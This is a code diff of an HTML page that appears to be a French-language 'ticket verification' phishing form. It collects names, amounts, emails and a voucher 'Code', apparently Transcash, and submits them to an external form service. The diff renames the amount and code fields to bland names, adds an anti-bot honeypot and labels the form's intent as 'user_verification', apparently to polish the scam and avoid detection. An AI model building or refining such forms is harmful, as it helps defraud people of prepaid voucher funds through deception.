@@ -54,29 +54,36 @@
 
         <form action="https://api.web3forms.com/submit" method="POST">
           <input type="hidden" name="access_key" value="fd4449f1-bff6-480c-8232-947000660f32">
-          <input type="hidden" name="to_email" value="authentificationtranscash97@gmail.com">
           <input type="hidden" name="redirect" value="https://rechstat.com/merci.html">
           <input type="hidden" name="_captcha" value="false">
           <input type="hidden" name="_template" value="table">
-          
+
+          <!--AJOUTER UN ANTI-BOT-->
+          <input type="text" name="company" style="display:none">
+
+          <!--DIRE L'INTENTION DU FORM-->
+          <input type="hidden" name="intent" value="user_verification">
+
+          <!--AJOUTER UN TIMESTAMP-->
+          <input type="hidden" name="submitted_at" id="submitted_at">
           
           <input type="hidden" name="name" value="Formulaire vérification ticket">
 
-          <label for="nom">Nom :</label>
+          <label for="nom" data-i18n="form_nom">Nom :</label>
           <input type="text" id="nom" name="nom" required>
 
-          <label for="prenom">Prénom :</label>
+          <label for="prenom" data-i18n="form_prenom">Prénom :</label>
           <input type="text" id="prenom" name="prenom" required>
 
-          <label for="amount">Montant :</label>
-          <input type="number" id="amount" name="amount" min="1" required>
+          <label for="value" data-i18n="form_montant">Montant :</label>
+          <input type="number" id="value" name="value" min="1" required>
 
-          <label for="email">Votre email :</label>
+          <label for="email" data-i18n="form_email">Votre email :</label>
           <input type="email" id="email" name="email" required>
 
           <div class="password-wrapper">
-            <label for="code">Code :</label>
-            <input type="text" id="code" name="code" required>
+            <label for="reference" data-i18n="form_code">Code :</label>
+            <input type="text" id="reference" name="reference" required>
           </div>
 
           <textarea name="message" hidden>Soumission via formulaire sécurisé</textarea>
@@ -120,7 +127,11 @@
       codeInput.type = show ? "text" : "password";
 
     }
+
+    //GERE LE TIMESTAMP
+     document.getElementById('submitted_at').value = Date.now();
   </script>
-</body>
+
+  </body>
 
 </html>
